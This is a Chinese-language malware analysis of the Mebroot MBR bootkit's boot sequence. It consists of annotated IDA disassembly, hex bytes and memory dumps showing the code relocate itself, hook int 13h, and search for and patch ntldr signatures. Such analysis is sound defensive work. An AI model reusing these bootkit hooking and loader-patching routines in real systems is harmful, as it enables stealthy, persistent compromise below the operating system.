                            _                                          _   
                           (_)                                        | |  
              __   ____  __ _  _   _  _ __ ___   _ __     _ __    ___ | |_ 
              \ \ / /\ \/ /| || | | || '_ ` _ \ | '_ \   | '_ \  / _ \| __|
               \ V /  >  < | || |_| || | | | | || |_) |_ | | | ||  __/| |_ 
                \_/  /_/\_\| | \__,_||_| |_| |_|| .__/(_)|_| |_| \___| \__|
                          _/ |                  | |                        
                         |__/                   |_| 
           
/---------------------------------------------------------------------------------------\
|>...................[                 mebroot MBR启动分析               ].............<|
|>......................[             by nEINEI/vxjump.net            ]................<|
|>.......................[              2011-08-22             ].......................<|
\>......................  [           neineit_at_gmail.com     ]  .....................</


mebroot感染后的内存分布图

; 0       0000h     512     实模式                                   virus bootload
; 60      7800h     512     保护模式                                 Ntldr的hook 代码
; 61      7A00h     512     映射                                     kernel 代码
; 62      7C00h     512     实模式                                   原windowsMBR

断点在MBR 加载处，分析病毒代码 ，以下分析是利用IDA 分析的，包括动态运行时及静态反汇编的代码

loc_7C00:                                  
seg000:7C00 FA                             cli                     ; 关中断
seg000:7C01 33 DB                          xor     bx, bx
seg000:7C03 8E D3                          mov     ss, bx
seg000:7C05 36 89 26 FE 7B                 mov     ss:7BFEh, sp    ; 设置一个新的堆栈,保留sp的值到7bfe
seg000:7C0A BC FE 7B                       mov     sp, 7BFEh
seg000:7C0D 1E                             push    ds
seg000:7C0E 66 60                          pushad                  ; 保存原寄存器,在执行原MBR程序时用
seg000:7C10 FC                             cld
seg000:7C11 8E DB                          mov     ds, bx
seg000:7C13 BE 13 04                       mov     si, 413h        ; 413h 段地址0040:0012 ，该地址空间存放系统内存大小

// 以我自己的本地xpsp2 机器测试此时 [si] --> 0x27f 
seg000:7C16 83 2C 02                      sub     word ptr [si], 2 ; 附加在系统内存的最后的2k中,即系统内存尾部

// 以我自己的本地xpsp2 机器测试此时 [si] --> 0x27d

seg000:7C19 AD                            lodsw  // 将[esi]->0x27d 读到eax
seg000:7C1A C1 E0 06                      shl     ax, 6

//  ax -->9f40 , 这里就是病毒要隐藏的地址,此时0x9f40 地址数据为0

//0x0000000000009f40 <bogus+       0>:    0x0000  0x0000  0x0000  0x0000  0x0000
//0x0000  0x0000  0x0000
//0x0000000000009f50 <bogus+      16>:    0x0000  0x0000  0x0000  0x0000  0x0000
//0x0000  0x0000  0x0000
//0x0000000000009f60 <bogus+      32>:    0x0000  0x0000  0x0000  0x0000

// 下面要拷贝自身到 0x9f40 处
seg000:7C1D 8E C0                         mov     es, ax          ; es 当作目的di 的段寄存器
seg000:7C1F BE 00 7C                      mov     si, 7C00h
seg000:7C22 33 FF                         xor     di, di
seg000:7C24 B9 00 01                      mov     cx, 256
seg000:7C27 F3 A5                         rep movsw               ; 拷贝自身512个字节过去

// 拷贝完毕后里面的数据内容

0x000000000009f400 <bogus+       0>:    0x33fa  0x8edb  0x36d3  0x2689  0x7bfe  0xfebc  0x1e7b  0x60
66
0x000000000009f410 <bogus+      16>:    0x8efc  0xbedb  0x0413  0x2c83  0xad02  0xe0c1  0x8e06  0xbe
c0
0x000000000009f420 <bogus+      32>:    0x7c00  0xff33  0x00b9  0xf301  0xb8a5  0x0202  0x3db1  0x80
ba
0x000000000009f430 <bogus+      48>:    0x8b00  0xcddf  0x3313  0x66db  0x478b  0x664c  0xa326  0x00
73
0x000000000009f440 <bogus+      64>:    0x47c7  0x664c  0x8c00  0x4e47  0x6806  0x004d  0xfbcb  0xc3
8e
0x000000000009f450 <bogus+      80>:    0x01b8  0xb902  0x003f  0x80ba  0xb700  0xcd7c  0x6613  0x1f
61
0x000000000009f460 <bogus+      96>:    0xea5c  0x7c00

seg000:7C29 B8 02 02                       mov     ax, 202h        ; al - 02,ah - 02 ,读2个扇区操作
seg000:7C2C B1 3D                          mov     cl, 61          ; 从60扇区开始
seg000:7C2E BA 80 00                       mov     dx, 80h ; '€'   ; 磁盘为默认80h
seg000:7C31 8B DF                          mov     bx, di          ; 缓冲区,此时 bx- 0x200 ，就是 es:0x200 -- 0x9f40 :200 -> 9f600
seg000:7C33 CD 13                          int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7C33                                                        ; AL = number of sectors to read, CH = track, CL = sector
seg000:7C33                                                        ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7C33                                                        ; Return: CF set on error, AH = status, AL = number of sectors read

// 此时把病毒在60 扇区里面的东西读到了内存0x9f60：0000 处 ，这里是 Ntldr的hook 代码，16it的code

0x000000000009f600 <bogus+       0>:    0xf08b  0xc085  0x759c  0x8305  0x2444  0x0004  0xfc60  0x7c
8b
0x000000000009f610 <bogus+      16>:    0x2424  0xe781  0x0000  0xfff0  0xc7b0  0x75ae  0x81fd  0x46
3f
0x000000000009f620 <bogus+      32>:    0x0034  0x7540  0xb0f5  0xaea1  0xfd75  0x378b  0x368b  0x36
8b
0x000000000009f630 <bogus+      48>:    0x5e8b  0x8b18  0x43eb  0x3b81  0x4b6a  0x196a  0xf775  0x7b
80
0x000000000009f640 <bogus+      64>:    0x8904  0x0375  0xc383  0x8006  0x047b  0x75e8  0x8de8  0x09
7b
0x000000000009f650 <bogus+      80>:    0xe8b0  0x75ae  0x66fd  0x7f81  0x8404  0x75c0  0x8bd8  0x8d
17
0x000000000009f660 <bogus+      96>:    0x3a54  0xe804

// 此时把病毒在61 扇区里面的东西读到了内存0x9f60：0200 处 ，这里是kernel hook代码

 
0x000000000009f800 <bogus+       0>:    0x148b  0x6824  0x5678  0x1234  0x0c8b  0x6824  0x5678  0x12
34
0x000000000009f810 <bogus+      16>:    0x200f  0x50c0  0xff25  0xfeff  0x0fff  0xc022  0xca2b  0x0f
58
0x000000000009f820 <bogus+      32>:    0xc022  0x34ff  0x6824  0xe062  0x3707  0x3be8  0x0000  0x59
00
0x000000000009f830 <bogus+      48>:    0x6859  0x01ab  0x0000  0x006a  0xd0ff  0xe860  0x0000  0x00
00
0x000000000009f840 <bogus+      64>:    0x835e  0x15c6  0xf88b  0x6a6a  0xf359  0xb1a5  0x8d80  0x00
be
0x000000000009f850 <bogus+      80>:    0xfffe  0xffff  0x33e0  0x61c0  0x74ff  0x0c24  0x54ff  0x08
24
0x000000000009f860 <bogus+      96>:    0x5a59  0x8760

// 此时还没有把原windows MBR 加载进来

// 现在要hook int 13 中断了。
seg000:7C35 33 DB                          xor     bx, bx
seg000:7C37 66 8B 47 4C                    mov     eax, [bx+4Ch]  //  0x4c / 4 = 0x13 把13号中断地址的内容放到eax处

// 此时0x4c 的数据

0x000000000000004c <bogus+       0>:       0xe3fe
seg000:7C3B 66 26 A3 73 00                 mov     es:73h, eax     ; 保留原13号中断例程地址 , 记住这个偏移，后面还会用到

// 保留到扩展段的0x9f40：73 的位置 (旧的int 13地址)
0x000000000009f473 <bogus+       0>:    0xe3fe  0xf000  0x882e  0x9026  0x9d00  0x2e9c  0x1eff  0x0


seg000:7C40 C7 47 4C 66 00                 mov     word ptr [bx+4Ch], 66h ; off 66h ，新入口例程,相对开始偏移66h的地方，记作Interrupt_13_hook
seg000:7C45 8C 47 4E                       mov     word ptr [bx+4Eh], es
seg000:7C48 06                             push    es
seg000:7C49 68 4D 00                       push    4Dh             ; 跳向sub_7c4d , es 已经被修正为指向内存末尾段，即reloc_meb_bootloader,后面代码是在内存中执行的
seg000:7C4C CB                             retf

// 此时跳向了内存当中的9f44d

内存中
(0) [0x000000000009f44d] 9f40:004d (unk. ctxt): sti                       ; fb

// 下面是IDA 中的代码，等效于在内存中的9f44d 

seg000:7C4D FB                             sti
seg000:7C4E 8E C3                          mov     es, bx          ; bx 此时是0，es 重设di 的指向
seg000:7C50 B8 01 02                       mov     ax, 201h        ; 读1个扇区
seg000:7C53 B9 3F 00                       mov     cx, 63          ; 62号扇区
seg000:7C56 BA 80 00                       mov     dx, 80h
seg000:7C59 B7 7C                          mov     bh, 7Ch         ; bh ,位置为7c00
seg000:7C5B CD 13                          int     13h        ; DISK - READ SECTORS INTO MEMORY
seg000:7C5B                                                        ; AL = number of sectors to read, CH = track, CL = sector
seg000:7C5B                                                        ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7C5B                                                        ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7C5D 66 61                          popad
seg000:7C5F 1F                             pop     ds
seg000:7C60 5C                             pop     sp
seg000:7C61 EA 00 7C 00 00                 jmp     loc_7C00        ; 跳向开始,从新引导程序.即把62扇区的数据（原MBR）加载到7c00，跳向执行


//下int 13 断点
b 0009f466 -- > 这里是被病毒hook的int13 位置
7c66 等效9f466 

 Interrupt_13_hook proc far
seg000:7C66 9C                             pushf
seg000:7C67 80 FC 42                       cmp     ah, 42h         ; 扩展int 13h调用 读方式
seg000:7C6A 74 0B                          jz      short loc_7C77
seg000:7C6C 80 FC 02                       cmp     ah, 2           ; 非扩展int 13方式读
seg000:7C6F 74 06                          jz      short loc_7C77
seg000:7C71 9D                             popf                    ; 不是这两种方式的情况下，调原int 13

// 以上处理是确定，如果是int 13 读操作，都要跳到病毒hook的代码


// 此时cs = 0x9f40 ，加上偏移0x90  ，实际是 0x9f490  ，此时ah = 2
seg000:7C77 2E 88 26 90 00           mov     cs:90h, ah

// 上面语句实际为了修改，seg000:7C8D B4 [00]                          mov     ah, 0   ---> 改为这样 mov ah,2 

seg000:7C7C 9D                             popf
seg000:7C7D 9C                             pushf
seg000:7C7E 2E FF 1E 73 00                 call    dword ptr cs:73h ; 上面提到过这个 73h 偏移，他存放了原int 13 中断 ， 此时病毒并不知道系统哪些情况下调用int 13，但要要是读调用，
seg000:7C83 0F 82 9D 00                    jb      exit_int_13        ;病毒就去扫描看当前是有自己要hook 的内核特征部分
seg000:7C87 9C                             pushf
seg000:7C88 FA                             cli
seg000:7C89 06                             push    es
seg000:7C8A 66 60                          pushad
seg000:7C8C FC                             cld
seg000:7C8D B4 00                          mov     ah, 0           ; 此处就被动态的修改为ah 的值了,里面记录是读，还是扩展读
seg000:7C8F B5 00                          mov     ch, 0
seg000:7C91 80 FD 42                       cmp     ch, 42h
seg000:7C94 75 04                          jnz     short loc_7C9A  ; ax 扇区数
seg000:7C96 AD                             lodsw                   ; ds:si 扩展方式，指向磁盘地址数据包
seg000:7C97 AD                             lodsw
seg000:7C98 C4 1C                          les     bx, [si]        ; 缓存位置
seg000:7C9A
seg000:7C9A                loc_7C9A:                               ; CODE XREF: Interrupt_13_hook+2E 
seg000:7C9A 85 C0                          test    ax, ax          ; ax 扇区数
seg000:7C9C 75 01                          jnz     short loc_7C9F
seg000:7C9E 40                             inc     ax              ; 最少得读1个，就是一次循环至少要扫描512 个字节长度，作为特征搜索的范围
seg000:7C9F
seg000:7C9F                loc_7C9F:                               ; CODE XREF: Interrupt_13_hook+36 
seg000:7C9F 8B C8                          mov     cx, ax
seg000:7CA1 B0 8B                          mov     al, 8Bh         ; 设置序列中第一个匹配的字符
seg000:7CA3 C1 E1 09                       shl     cx, 9           ; 设置成512 * al 个 ,要扫描的特征长度
seg000:7CA6 8B FB                          mov     di, bx
seg000:7CA8 60                             pusha
seg000:7CA9
seg000:7CA9                loc_7CA9:                               ; CODE XREF: Interrupt_13_hook+4F 
seg000:7CA9                                                        ; Interrupt_13_hook+57 
seg000:7CA9 F2 AE                          repne scasb
seg000:7CAB 75 47                          jnz     short loc_7CF4  ; 检测 ntldr 中的特征序列 8B F0 85 F6 74 21/22 80 3D
seg000:7CAD 66 26 81 3D F0+                cmp     dword ptr es:[di], 74F685F0h
seg000:7CB5 75 F2                          jnz     short loc_7CA9
seg000:7CB7 26 81 7D 05 80+                cmp     word ptr es:[di+5], 3D80h
seg000:7CBD 75 EA                          jnz     short loc_7CA9
seg000:7CBF 26 8A 45 04                    mov     al, es:[di+4]
seg000:7CC3 3C 21                          cmp     al, 21h         ; 检测是否hooed， 21h ,为 ntldr jz $23 指令
seg000:7CC5 74 04                          jz      short loc_7CCB  ; 感染标志
seg000:7CC7 3C 22                          cmp     al, 22h
seg000:7CC9 75 DE                          jnz     short loc_7CA9  ; 不是要检测的特征，继续搜索
seg000:7CCB
seg000:7CCB                loc_7CCB:                               ; CODE XREF: Interrupt_13_hook+5F 
seg000:7CCB BE 0B 02                       mov     si, 20Bh        ; 感染标志
seg000:7CCE 2E 80 3C 00                    cmp     byte ptr cs:[si], 0
seg000:7CD2 75 20                          jnz     short loc_7CF4
seg000:7CD4 2E 88 04                       mov     cs:[si], al     ; 写入这个标志，在病毒MBR代码后面0xb的位置 ， 这个al值就是 0x21 or 0x22 。

// 此时，es = 0x46a  di = 0x120 ,下面的病毒代码将要patch调这里。
// 正常的ntldr代码是，
/*
00046b1f: (                    ): mov si, ax                ; 8bf0       ---  patch 调这里2个字节， 将0xf0 , 改为 ff 15
00046b21: (                    ): test si, si               ; 85f6
00046b23: (                    ): jz .+33                   ; 7421
00046b25: (                    ): cmp byte ptr ds:[di], 0xf8 ; 803df8
00046b28: (                    ): scasb byte ptr es:[di], al ; ae
00046b29: (                    ): inc bx                    ; 43
00046b2a: (                    ): add byte ptr ds:[bx+si], al ; 0000
00046b2c: (                    ): jz .+7                    ; 7407
00046b2e: (                    ): xor si, si                ; 33f6
*/

//hook 后的代码
/*
00046b1d: (                    ): add byte ptr ds:[bx+si], al ; 0000
00046b1f: (                    ): call word ptr ds:[di]     ; ff15       ---------> 这里被修改为call，此时还没有继续重定位，后面会计算一下，进行重定位
00046b21: (                    ): test si, si               ; 85f6
00046b23: (                    ): jz .+33                   ; 7421
00046b25: (                    ): cmp byte ptr ds:[di], 0xf8 ; 803df8
00046b28: (                    ): scasb byte ptr es:[di], al ; ae
00046b29: (                    ): inc bx                     ; 43
00046b2a: (                    ): add byte ptr ds:[bx+si], al ; 0000
*/


seg000:7CD7 26 C7 45 FF FF+                mov     word ptr es:[di-1], 15FFh ; hook 掉ntldr,修改原mov esi,eax ,改jump xxx
seg000:7CDD 66 8C C8                       mov     eax, cs  // cs = 0x0x9f40 ,也就是病毒MBR代码运行的段地址
seg000:7CE0 66 C1 E0 04                    shl     eax, 4    // 计算病毒MBR基址
seg000:7CE4 05 00 02                       add     ax, 200h  //跳过病毒MBR代码
seg000:7CE7 66 2E A3 FC 01                 mov     cs:1FCh, eax  // cs:1fch 这块是病毒MBR空白的数据位置，把eax = 0x9f600 ，保留到这里 ，此时覆盖了内存里面MBR 0x55aa 的这个标志
seg000:7CEC 2D 04 00                       sub     ax, 4
seg000:7CEF 66 26 89 45 01                 mov     es:[di+1], eax  ; eax = 0x9f5fc  写入目的地址 , 这样ntldr 的那处代码被修改为 call [0x009f5fc] ,这样就又回到了病毒代码处
seg000:7CF4
seg000:7CF4                loc_7CF4:                               ; CODE XREF: Interrupt_13_hook+45 
seg000:7CF4                                                        ; Interrupt_13_hook+6C 
seg000:7CF4 61                             popa

// patch 第二位置
seg000:7CF5 B0 83                          mov     al, 83h         ; 查找下一个特征 83  C4 02 E9 00 00 E9 FD FF
seg000:7CF7
seg000:7CF7                loc_7CF7:                               ; CODE XREF: Interrupt_13_hook+9D 
seg000:7CF7                                                        ; Interrupt_13_hook+A8 
seg000:7CF7 F2 AE                          repne scasb
seg000:7CF9 75 25                          jnz     short loc_7D20
seg000:7CFB 66 26 81 3D C4+                cmp     dword ptr es:[di], 0E902C4h
seg000:7D03 75 F2                          jnz     short loc_7CF7
seg000:7D05 66 26 81 7D 04+                cmp     dword ptr es:[di+4], 0FFFDE900h
seg000:7D0E 75 E7                          jnz     short loc_7CF7
seg000:7D10 66 26 C7 45 FC+                mov     dword ptr es:[di-4], 83909090h
seg000:7D19 26 83 65 06 00                 and     word ptr es:[di+6], 0
seg000:7D1E EB D7                          jmp     short loc_7CF7
seg000:7D20                ; ---------------------------------------------------------------------------
seg000:7D20
seg000:7D20                loc_7D20:                               ; CODE XREF: Interrupt_13_hook+93 
seg000:7D20 66 61                          popad
seg000:7D22 07                             pop     es
seg000:7D23 9D                             popf
seg000:7D24
seg000:7D24                exit_int_13:                            ; CODE XREF: Interrupt_13_hook+1D 
seg000:7D24 CA 02 00                       retf    2

// 至此，启动过程就结束了，就等待这内存加载自己的另外扇区的代码了。







